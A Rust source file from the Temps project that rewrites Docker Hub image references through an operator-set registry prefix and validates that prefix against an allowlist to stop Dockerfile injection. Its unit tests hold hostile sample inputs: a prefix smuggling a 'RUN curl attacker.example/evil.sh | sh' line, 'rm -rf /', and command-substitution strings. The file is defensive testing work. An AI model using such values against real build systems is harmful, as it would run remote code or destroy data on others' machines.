// SPDX-FileCopyrightText: 2024-2026 Temps Contributors
// SPDX-License-Identifier: MIT OR Apache-2.0

//! Detects implicit Docker Hub image references and rewrites them through an
//! operator-configured registry mirror/prefix.
//!
//! Every base image Temps builds against (autopack's generated Dockerfiles,
//! external service images) is normally an unqualified reference like
//! `node:22-slim` or `debian:bookworm-slim` — Docker resolves those against
//! `docker.io` with no credentials attached, and Docker Hub throttles
//! anonymous pulls by source IP. Some operators run an internal registry that
//! is a path-prefixing reverse proxy rather than a `registry-mirrors`
//! (pull-through cache) protocol implementation, so the daemon-level
//! `registry-mirrors` option (see `docs/howto/configure-a-docker-registry-mirror`)
//! doesn't work for them — the only way to route through their proxy is to
//! rewrite the reference itself before it reaches the daemon.
//!
//! This module is the single place that decides "is this reference implicit
//! Docker Hub" and "what does it become under the configured prefix", so
//! every call site (autopack Dockerfile generation, direct image pulls)
//! agrees on the same rule.

/// Returns `true` when `image` has no explicit registry host, i.e. Docker
/// would resolve it against `docker.io`.
///
/// Mirrors the rule Docker's own reference parser uses: the first path
/// segment (up to the first `/`) is a registry host only if it contains a
/// `.` or `:`, or is exactly `localhost`. A bare `library/postgres` or
/// `bitnami/postgresql` has no such segment and is still Docker Hub; `node`
/// (no `/` at all) is the official-image shorthand and is always Docker Hub
/// regardless of a tag's `:` (the tag separator is not a host separator when
/// there is no `/` in the reference at all).
pub fn is_docker_hub_image(image: &str) -> bool {
    let Some((first_segment, _rest)) = image.split_once('/') else {
        // No slash at all: either "node" or "node:22-slim" — both are the
        // official-image shorthand on docker.io. Never mistake the tag's `:`
        // for a host port here.
        return true;
    };

    let looks_like_registry_host =
        first_segment.contains('.') || first_segment.contains(':') || first_segment == "localhost";

    !looks_like_registry_host
}

/// Returns `true` when `prefix` is safe to splice verbatim into a
/// `FROM <prefix>/<image>` line.
///
/// A registry host+path is restricted to this allowlist in practice
/// (alphanumerics, `.`, `-`, `_`, `:` for a port, `/` for path segments).
/// Rejecting everything else — in particular any whitespace, since a bare
/// `str::trim()` only strips *leading/trailing* whitespace and leaves an
/// embedded `\n` untouched — is what actually closes the injection: an
/// operator-controlled prefix containing a newline would otherwise land
/// verbatim inside a generated Dockerfile and become a syntactically
/// independent BuildKit instruction (e.g. a smuggled `RUN` line).
///
/// Public so the settings write path (`temps-config`) can reject a bad value
/// at the API boundary with a clear 400, using the exact same rule this
/// module enforces defense-in-depth at build time — one allowlist, not two
/// that can drift apart.
pub fn is_valid_registry_prefix(prefix: &str) -> bool {
    !prefix.is_empty()
        && prefix
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ':' | '/'))
}

/// Rewrite `image` through `prefix` if it is an implicit Docker Hub
/// reference and a prefix is configured; otherwise return it unchanged.
///
/// The rewrite is a plain concatenation (`{prefix}/{image}`), matching how
/// operators' existing registry proxies already rewrite other tooling's
/// image references — it does not expand the implicit `library/` namespace,
/// since a proxy that accepts `<prefix>/gotempsh/temps` is expected to accept
/// `<prefix>/node` the same way.
///
/// A malformed prefix (anything outside the registry host+path character
/// set — most importantly, embedded whitespace/control characters) is
/// treated exactly like an absent prefix rather than spliced in: this
/// function has to stay fail-closed on its own, since it is the last line of
/// defense before the value is written into a Dockerfile, independent of
/// whatever validation ran (or didn't) when the value was saved.
pub fn qualify_with_registry_prefix(image: &str, prefix: Option<&str>) -> String {
    match prefix.map(str::trim) {
        Some(prefix) if !prefix.is_empty() && is_docker_hub_image(image) => {
            let prefix = prefix.trim_end_matches('/');
            if is_valid_registry_prefix(prefix) {
                format!("{prefix}/{image}")
            } else {
                image.to_string()
            }
        }
        _ => image.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn recognises_implicit_docker_hub_references() {
        assert!(is_docker_hub_image("node:22-slim"));
        assert!(is_docker_hub_image("node"));
        assert!(is_docker_hub_image("debian:bookworm-slim"));
        assert!(is_docker_hub_image("bitnami/postgresql:16"));
        assert!(is_docker_hub_image("library/node:22-slim"));
    }

    #[test]
    fn recognises_already_qualified_references_as_not_docker_hub() {
        assert!(!is_docker_hub_image("ghcr.io/gotempsh/temps:latest"));
        assert!(!is_docker_hub_image("quay.io/coreos/etcd:v3.5.0"));
        assert!(!is_docker_hub_image("localhost:5000/myimage:latest"));
        assert!(!is_docker_hub_image(
            "registry.example.com:5000/team/app:latest"
        ));
    }

    #[test]
    fn qualifies_only_docker_hub_references_when_a_prefix_is_configured() {
        assert_eq!(
            qualify_with_registry_prefix("node:22-slim", Some("registry.example.com/docker")),
            "registry.example.com/docker/node:22-slim"
        );
        assert_eq!(
            qualify_with_registry_prefix(
                "gotempsh/temps:latest",
                Some("registry.example.com/docker")
            ),
            "registry.example.com/docker/gotempsh/temps:latest"
        );

        // Already-qualified references pass through untouched even with a
        // prefix configured — rewriting them would point at the wrong host.
        assert_eq!(
            qualify_with_registry_prefix(
                "ghcr.io/gotempsh/temps:latest",
                Some("registry.example.com/docker")
            ),
            "ghcr.io/gotempsh/temps:latest"
        );
    }

    #[test]
    fn leaves_images_unchanged_when_no_prefix_is_configured() {
        assert_eq!(
            qualify_with_registry_prefix("node:22-slim", None),
            "node:22-slim"
        );
        assert_eq!(
            qualify_with_registry_prefix("node:22-slim", Some("")),
            "node:22-slim"
        );
    }

    #[test]
    fn trims_a_trailing_slash_on_the_configured_prefix() {
        assert_eq!(
            qualify_with_registry_prefix("node:22-slim", Some("registry.example.com/docker/")),
            "registry.example.com/docker/node:22-slim"
        );
    }

    #[test]
    fn trims_leading_and_trailing_whitespace_on_the_configured_prefix() {
        // An operator pasting the prefix into the settings UI can easily pick
        // up a trailing newline or leading space; left untrimmed, that
        // whitespace lands verbatim inside every generated `FROM` line and
        // breaks the build with an invalid image reference.
        assert_eq!(
            qualify_with_registry_prefix("node:22-slim", Some("  registry.example.com/docker \n")),
            "registry.example.com/docker/node:22-slim"
        );

        // Whitespace-only "prefix" must behave exactly like `None`, not like
        // an empty-string prefix baked onto every image.
        assert_eq!(
            qualify_with_registry_prefix("node:22-slim", Some("   ")),
            "node:22-slim"
        );
    }

    #[test]
    fn refuses_to_splice_a_prefix_containing_an_embedded_newline() {
        // `str::trim()` only strips leading/trailing whitespace -- an
        // embedded `\n` survives it and, if spliced into a generated
        // Dockerfile, becomes a syntactically independent BuildKit
        // instruction. This must never reach the output: fall back to the
        // unmodified image exactly as if no prefix were configured.
        let malicious = "registry.example.com\nRUN curl attacker.example/evil.sh | sh\nFROM registry.example.com";
        assert_eq!(
            qualify_with_registry_prefix("node:22-slim", Some(malicious)),
            "node:22-slim"
        );
    }

    #[test]
    fn refuses_to_splice_a_prefix_containing_other_control_or_shell_metacharacters() {
        for malicious in [
            "registry.example.com\r\nFROM evil",
            "registry.example.com\0",
            "registry.example.com; rm -rf /",
            "registry.example.com`whoami`",
            "registry.example.com$(whoami)",
            "registry.example.com\"",
        ] {
            assert_eq!(
                qualify_with_registry_prefix("node:22-slim", Some(malicious)),
                "node:22-slim",
                "expected {malicious:?} to be rejected"
            );
        }
    }

    #[test]
    fn accepts_a_well_formed_prefix_with_a_port_and_path() {
        assert_eq!(
            qualify_with_registry_prefix(
                "node:22-slim",
                Some("registry.example.com:5000/team_a/docker-mirror")
            ),
            "registry.example.com:5000/team_a/docker-mirror/node:22-slim"
        );
    }
}
